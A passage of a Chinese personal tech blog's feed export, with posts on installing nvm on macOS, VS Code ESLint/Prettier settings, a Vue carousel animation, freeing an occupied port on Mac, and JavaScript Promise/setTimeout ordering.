-s &quot;/usr/local/opt/nvm/nvm.sh&quot; ] &amp;&amp; . &quot;/usr/local/opt/nvm/nvm.sh&quot;  # This loads nvm</span><br><span class="line">  [ -s &quot;/usr/local/opt/nvm/etc/bash_completion.d/nvm&quot; ] &amp;&amp; . &quot;/usr/local/opt/nvm/etc/bash_completion.d/nvm&quot;  # This loads nvm bash_completion</span><br></pre></td></tr></table></figure><p>按照提示信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/.nvm</span><br></pre></td></tr></table></figure><p>在<code>~/.bash_profile</code>文件中添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export NVM_DIR=&quot;$HOME/.nvm&quot;</span><br><span class="line">  [ -s &quot;/usr/local/opt/nvm/nvm.sh&quot; ] &amp;&amp; . &quot;/usr/local/opt/nvm/nvm.sh&quot;  # This loads nvm</span><br><span class="line">  [ -s &quot;/usr/local/opt/nvm/etc/bash_completion.d/nvm&quot; ] &amp;&amp; . &quot;/usr/local/opt/nvm/etc/bash_completion.d/nvm&quot;  # This loads nvm bash_completion</span><br></pre></td></tr></table></figure><p>如果没有.bash_profile 文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">touch .bash_profile</span><br></pre></td></tr></table></figure><blockquote><p>备注：没有.bash_profile 文件，创建并添加后，需要重启终端</p></blockquote><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>安装成功后可通过<code>nvm -v</code>检测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">nvm list  // 查看当前存在在node</span><br><span class="line">nvm install node // 安装最新版本nvm</span><br><span class="line">nvm --help // 自行查看帮助</span><br><span class="line">Example:</span><br><span class="line"></span><br><span class="line">  nvm install 8.0.0                     Install a specific version number</span><br><span class="line"></span><br><span class="line">  nvm use 8.0                           Use the latest available 8.0.x release</span><br><span class="line"></span><br><span class="line">  nvm run 6.10.3 app.js                 Run app.js using node 6.10.3</span><br><span class="line"></span><br><span class="line">  nvm exec 4.8.3 node app.js            Run `node app.js` with the PATH pointing to node 4.8.3</span><br><span class="line"></span><br><span class="line">  nvm alias default 8.1.0               Set default node version on a shell</span><br><span class="line"></span><br><span class="line">  nvm alias default node                Always default to the latest available node version on a shell</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前段时间重装了下系统，就想着把&lt;code&gt;nvm&lt;/code&gt;的安装也记录一下，便于我之后可以潇洒丢给对方一个链接，并保持自己的高冷。&lt;br&gt;
    
    </summary>
    
    
      <category term="nvm" scheme="https://luckyp.top/tags/nvm/"/>
    
      <category term="mac" scheme="https://luckyp.top/tags/mac/"/>
    
  </entry>
  
  <entry>
    <title>vscode格式化eslint</title>
    <link href="https://luckyp.top/vscode%E6%A0%BC%E5%BC%8F%E5%8C%96eslint/"/>
    <id>https://luckyp.top/vscode格式化eslint/</id>
    <published>2019-11-06T16:00:00.000Z</published>
    <updated>2019-11-06T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>之前使用 vue-cli3 本身自带有指令<code>npm run lint</code>，可以修复 eslint 报错的格式问题，甚至通过配置文件<code>vue.config.js</code>中的配置项<code>lintOnSave</code>来实现保存时自动格式化。对于格式化保持的代码风格，平时工作也很有用，可以通过配置编辑器实现。</p><a id="more"></a><h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><p><code>shift+command+X</code>唤醒扩展，或者右侧插件应用商店搜索相应插件。</p><ul><li>ESlint：javascript 代码检测工具，可以配置每次保存时格式化 js，但每次保存只格式化一点点，你得连续按住 Ctrl+S 好几次,才格式化好</li><li>vetur：可以格式化 html、标准 css（有分号 、大括号的那种）、标准 js（有分号 、双引号的那种）、vue 文件</li><li>Prettier - Code formatter：只关注格式化，并不具有 eslint 检查语法等能力，只关心格式化文件(最大长度、混合标签和空格、引用样式等)，包括 JavaScript · Flow · TypeScript · CSS · SCSS · Less · JSX · Vue · GraphQL · JSON · Markdown</li></ul><h2 id="配置-vscode"><a href="#配置-vscode" class="headerlink" title="配置 vscode"></a>配置 vscode</h2><p>首选项 =&gt; 设置 =&gt; settings.json</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 私货，比较喜欢的主题</span></span><br><span class="line">    <span class="string">"workbench.colorTheme"</span>: <span class="string">"One Dark Pro"</span>,</span><br><span class="line">    <span class="comment">// vscode默认启用了根据文件类型自动设置tabsize的选项</span></span><br><span class="line">    <span class="string">"editor.detectIndentation"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="comment">// 重新设定tabsize</span></span><br><span class="line">    <span class="string">"editor.tabSize"</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="comment">// 每次保存的时候自动格式化</span></span><br><span class="line">    <span class="string">"editor.formatOnSave"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">// 每次保存的时候将代码按eslint格式进行修复</span></span><br><span class="line">    <span class="string">"eslint.autoFixOnSave"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">// 添加 vue 支持</span></span><br><span class="line">    <span class="string">"eslint.validate"</span>: [</span><br><span class="line">        <span class="string">"javascript"</span>,</span><br><span class="line">        <span class="string">"javascriptreact"</span>,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"language"</span>: <span class="string">"vue"</span>,</span><br><span class="line">            <span class="string">"autoFix"</span>: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="comment">// 让prettier使用eslint的代码格式进行校验，eslint6暂不兼容</span></span><br><span class="line">    <span class="string">"prettier.eslintIntegration"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">// 去掉代码结尾的分号</span></span><br><span class="line">    <span class="string">"prettier.semi"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="comment">// 使用带引号替代双引号</span></span><br><span class="line">    <span class="string">"prettier.singleQuote"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">// 让函数(名)和后面的括号之间加个空格</span></span><br><span class="line">    <span class="string">"javascript.format.insertSpaceBeforeFunctionParenthesis"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">// 按用户自身习惯选择</span></span><br><span class="line">    <span class="string">"vetur.format.defaultFormatter.html"</span>: <span class="string">"js-beautify-html"</span>,</span><br><span class="line">    <span class="comment">// 让vue中的js按编辑器自带的ts格式进行格式化</span></span><br><span class="line">    <span class="string">"vetur.format.defaultFormatter.js"</span>: <span class="string">"vscode-typescript"</span>,</span><br><span class="line">    <span class="string">"vetur.format.defaultFormatterOptions"</span>: &#123;</span><br><span class="line">        <span class="string">"js-beautify-html"</span>: &#123;</span><br><span class="line">            <span class="string">"wrap_attributes"</span>: <span class="string">"force-aligned"</span></span><br><span class="line">            <span class="comment">// #vue组件中html代码格式化样式</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>关于平时会用的<code>html、css、js</code>之类的，比较推荐使用插件<code>Beautify</code>,需要格式化的时候，直接打开<code>查看 =&gt; 命令面板</code>或者<code>command+shift+P</code>输入 beautify 即可（也可以自行配置启动命令）。</p><p>类似 vscode 配置<a href="https://www.jianshu.com/p/f15b67c94c78" target="_blank" rel="noopener">https://www.jianshu.com/p/f15b67c94c78</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前使用 vue-cli3 本身自带有指令&lt;code&gt;npm run lint&lt;/code&gt;，可以修复 eslint 报错的格式问题，甚至通过配置文件&lt;code&gt;vue.config.js&lt;/code&gt;中的配置项&lt;code&gt;lintOnSave&lt;/code&gt;来实现保存时自动格式化。对于格式化保持的代码风格，平时工作也很有用，可以通过配置编辑器实现。&lt;/p&gt;
    
    </summary>
    
      <category term="工具" scheme="https://luckyp.top/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="编辑器" scheme="https://luckyp.top/tags/%E7%BC%96%E8%BE%91%E5%99%A8/"/>
    
      <category term="vscode" scheme="https://luckyp.top/tags/vscode/"/>
    
      <category term="插件" scheme="https://luckyp.top/tags/%E6%8F%92%E4%BB%B6/"/>
    
      <category term="eslint" scheme="https://luckyp.top/tags/eslint/"/>
    
  </entry>
  
  <entry>
    <title>vue轮播动画效果</title>
    <link href="https://luckyp.top/vue%E8%BD%AE%E6%92%AD%E5%8A%A8%E7%94%BB%E6%95%88%E6%9E%9C/"/>
    <id>https://luckyp.top/vue轮播动画效果/</id>
    <published>2019-09-27T16:00:00.000Z</published>
    <updated>2019-09-27T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>本身vue有v-show这个通过改变<code>display:none/block</code>来实现显隐的功能，可以通过定位在同一位置，通过切换index来实现显隐。当然变化过于生硬，通过<code>transition-group</code>实现动画过渡效果，让其显示为左右滑动的效果。<br><a id="more"></a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">transition-group</span> <span class="attr">:name</span>=<span class="string">"animationName"</span> <span class="attr">tag</span>=<span class="string">"ul"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"(item,index) in list"</span> <span class="attr">class</span>=<span class="string">"nav-item"</span> <span class="attr">key</span>=<span class="string">"0"</span> <span class="attr">v-show</span>=<span class="string">"current == index"</span>&gt;</span></span><br><span class="line">        &#123;&#123;item&#125;&#125;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">transition-group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"nav_left"</span> @<span class="attr">click</span>=<span class="string">"changeCur(-1)"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"@/assets/arrow_left.png"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"nav_right"</span> @<span class="attr">click</span>=<span class="string">"changeCur(1)"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"@/assets/arrow_right.png"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  name: <span class="string">'home'</span>,</span><br><span class="line">  data() &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      list:[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    changeCur(num) &#123;</span><br><span class="line">      <span class="keyword">this</span>.animationName = num&gt;<span class="number">0</span>?<span class="string">'right'</span>:<span class="string">'left'</span></span><br><span class="line">      <span class="keyword">this</span>.current = <span class="keyword">this</span>.current + num;</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">this</span>.current &gt;= <span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>.current = <span class="number">0</span></span><br><span class="line">      &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>.current &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">this</span>.current = <span class="number">2</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.left-enter-active</span>,</span><br><span class="line"><span class="selector-class">.right-enter-active</span> &#123;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateX</span>(0);</span><br><span class="line">  <span class="attribute">transition</span>: all <span class="number">0.6s</span> ease;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.left-leave-active</span> &#123;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateX</span>(100%);</span><br><span class="line">  <span class="attribute">transition</span>: all <span class="number">0.6s</span> ease;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.left-enter</span> &#123;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateX</span>(-100%);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.left-leave</span>,</span><br><span class="line"><span class="selector-class">.right-leave</span> &#123;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateX</span>(0);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.right-leave-active</span> &#123;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateX</span>(-100%);</span><br><span class="line">  <span class="attribute">transition</span>: all <span class="number">0.6s</span> ease;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.right-enter</span> &#123;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateX</span>(100%);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.nav-item</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">14px</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="selector-class">.arrow_left</span>&#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">67px</span>;</span><br><span class="line">  img&#123;</span><br><span class="line">    <span class="selector-tag">width</span>: 16<span class="selector-tag">px</span>;</span><br><span class="line">    <span class="selector-tag">height</span>: 16<span class="selector-tag">px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.arrow_right</span>&#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">67px</span>;</span><br><span class="line">  img&#123;</span><br><span class="line">    <span class="selector-tag">width</span>: 16<span class="selector-tag">px</span>;</span><br><span class="line">    <span class="selector-tag">height</span>: 16<span class="selector-tag">px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本身vue有v-show这个通过改变&lt;code&gt;display:none/block&lt;/code&gt;来实现显隐的功能，可以通过定位在同一位置，通过切换index来实现显隐。当然变化过于生硬，通过&lt;code&gt;transition-group&lt;/code&gt;实现动画过渡效果，让其显示为左右滑动的效果。&lt;br&gt;
    
    </summary>
    
      <category term="vue" scheme="https://luckyp.top/categories/vue/"/>
    
    
      <category term="vue" scheme="https://luckyp.top/tags/vue/"/>
    
      <category term="动画" scheme="https://luckyp.top/tags/%E5%8A%A8%E7%94%BB/"/>
    
  </entry>
  
  <entry>
    <title>Mac解决端口占用</title>
    <link href="https://luckyp.top/Mac%E8%A7%A3%E5%86%B3%E7%AB%AF%E5%8F%A3%E5%8D%A0%E7%94%A8/"/>
    <id>https://luckyp.top/Mac解决端口占用/</id>
    <published>2019-07-06T02:07:19.000Z</published>
    <updated>2019-07-06T02:07:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>非法关闭启用的服务，再次启用时，会提示接口被占用，需要进行以下步骤。<br><a id="more"></a></p><h2 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h2><p>终端输入：<code>lsof -i tcp:port</code> 将<code>port</code>换成被占用的端口(如：8080、4000)</p><p>出现一个table表格数据，将会展示占用端口的进程信息</p><h2 id="kill进程"><a href="#kill进程" class="headerlink" title="kill进程"></a>kill进程</h2><p>找到进程的<code>PID</code>,使用kill命令：<code>kill PID</code>（进程的PID，如2044），杀死对映的进程</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;非法关闭启用的服务，再次启用时，会提示接口被占用，需要进行以下步骤。&lt;br&gt;
    
    </summary>
    
    
      <category term="Mac" scheme="https://luckyp.top/tags/Mac/"/>
    
      <category term="服务" scheme="https://luckyp.top/tags/%E6%9C%8D%E5%8A%A1/"/>
    
  </entry>
  
  <entry>
    <title>Promise与setTimeOut</title>
    <link href="https://luckyp.top/Promise%E4%B8%8EsetTimeOut/"/>
    <id>https://luckyp.top/Promise与setTimeOut/</id>
    <published>2019-04-02T16:00:00.000Z</published>
    <updated>2019-04-02T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>当同时存在<code>Promise</code>与<code>setTimeOut</code>时，它们的执行顺序是什么呢？<br><a id="more"></a></p><p>作为浏览器或者运行环境，在拿到开发者给的JavaScript的代码后，首先要传递给JavaScript引擎，让其执行。但是JavaScript的运行，往往需要时间，这时候就需要一个认知，一个JavaScript引擎会常驻内存，等待我们将代码或者函数传递给它。</p><h2 id="es3及之后"><a href="#es3及之后" class="headerlink" title="es3及之后"></a>es3及之后</h2><p>在早期，JavaScript没有异步执行的概念，当传递代码时，往往是顺序执行宿主（浏览器）发起的任务。</p><p>es5之后，JavaScript引入了<code>Promise</code>，JavaScript可以发起任务，而不需要浏览器的安排。</p><p>这里浏览器发起的任务为宏观任务，JavaScript引擎发起的任务为微观任务。</p><h2 id="宏观任务与微观任务"><a href="#宏观任务与微观任务" class="headerlink" title="宏观任务与微观任务"></a>宏观任务与微观任务</h2><p>JavaScript引擎等待宿主分配宏观任务，在操作系统中，等待行为称为事件循环。</p><p>简单来讲就是“等待” - “执行”。这里省略了判断循环是否结束，宏观队列的问题。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(TRUE)&#123;</span><br><span class="line">    r = wait();</span><br><span class="line">    execute(r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每次的执行过程，就是一个宏观任务，事件的循环也可以称为宏观任务队列。<br>在宏观任务中，JavaScript会执行<code>Promise</code>异步代码。JavaScript要保证代码在宏观任务里执行，因此宏观任务包含一个微观任务队列。</p><p>有了宏观任务和微观任务，就可以实现JavaScript的引擎和宿主任务了。这里，<code>Promise</code>永远在队列尾部添加微观任务，<code>setTimeOut</code>等宿主API，则添加宏观任务。</p><h2 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h2><p><code>Promise</code> 是 JavaScript 语言提供的一种标准化的异步管理方式，它的总体思想是，需要进行 io、等待或者其它异步操作的函数，不返回真实结果，而返回一个“承诺”，函数的调用方可以在合适的时机，选择等待这个承诺兑现（通过 <code>Promise</code> 的 then 方法的回调）。</p><p>执行顺序分析：</p><ul><li>分析几个宏观任务</li><li>确定每个宏观任务里有几个微观任务</li><li>根据调用顺序，确定微观任务执行顺序</li><li>确定宏观任务顺序</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">    setTimeout(<span class="function"><span class="params">()</span>=&gt;</span><span class="built_in">console</span>.log(<span class="string">"d"</span>), <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">var</span> r = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">        resolve()</span><br><span class="line">    &#125;);</span><br><span class="line">    r.then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> begin = <span class="built_in">Date</span>.now();</span><br><span class="line">        <span class="keyword">while</span>(<span class="built_in">Date</span>.now() - begin &lt; <span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"c1"</span>)</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">            resolve()</span><br><span class="line">        &#125;).then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">"c2"</span>))</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="comment">// 这里就不难理解，当代码执行时，输出c1、c2、d</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params">duration</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"b"</span>);</span><br><span class="line">            setTimeout(resolve,duration);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"a"</span>);</span><br><span class="line">    sleep(<span class="number">5000</span>).then(<span class="function"><span class="params">()</span>=&gt;</span><span class="built_in">console</span>.log(<span class="string">"c"</span>));</span><br><span class="line"><span class="comment">// a,b,c</span></span><br></pre></td></tr></table></figure><h2 id="asyc-await"><a href="#asyc-await" class="headerlink" title="asyc/await"></a>asyc/await</h2><p>es6新引入的特性，其运行基础为<code>Promise</code>,<code>asyc</code>函数必须返回<code>Promise</code>，返回的<code>Promise</code>即为异步函数。</p><p>async 函数是一种特殊语法，特征是在 function 关键字之前加上 async 关键字，这样，就定义了一个 async 函数，我们可以在其中使用 await 来等待一个 <code>Promise</code>。</p><p>其强大之处在于可以嵌套。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 盒子绿三秒，黄1秒，红三秒</span></span><br><span class="line"><span class="comment">//&lt;div id="light" style="background: #fff;width:10px;height:10px;"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params">duration</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve</span>)</span>&#123;</span><br><span class="line">        setTimeout(resolve, duration);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">changeColor</span>(<span class="params">duration,color</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"light"</span>).style.background = color;</span><br><span class="line">    <span class="keyword">await</span> sleep(duration);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="keyword">await</span> changeColor(<span class="number">3000</span>,<span class="string">"green"</span>);</span><br><span class="line">        <span class="keyword">await</span> changeColor(<span class="number">1000</span>, <span class="string">"yellow"</span>);</span><br><span class="line">        <span class="keyword">await</span> changeColor(<span class="number">2000</span>, <span class="string">"red"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;当同时存在&lt;code&gt;Promise&lt;/code&gt;与&lt;code&gt;setTimeOut&lt;/code&gt;时，它们的执行顺序是什么呢？&lt;br&gt;
    
    </summary>
    
      <category term="js" scheme="https://luckyp.top/categories/js/"/>
    
    
      <category term="promise" scheme="https://luckyp.top/tags/promise/"/>
    
      <category term="es6" scheme="https://luckyp.top/tags/es6/"/>
    
      <category term="事件循环" scheme="https://luckyp.top/tags/%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/"/>
    
  </entry>
  
  <entry>
    <title>类型转换</title>
    <link href="https://luckyp.top/%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/"/>
    <id>https://luckyp.top/类型转换/</id>
    <published>2019-03-11T16:00:00.000Z</published>
    <updated>2019-03-11T16:00:00.000Z</updated>
    
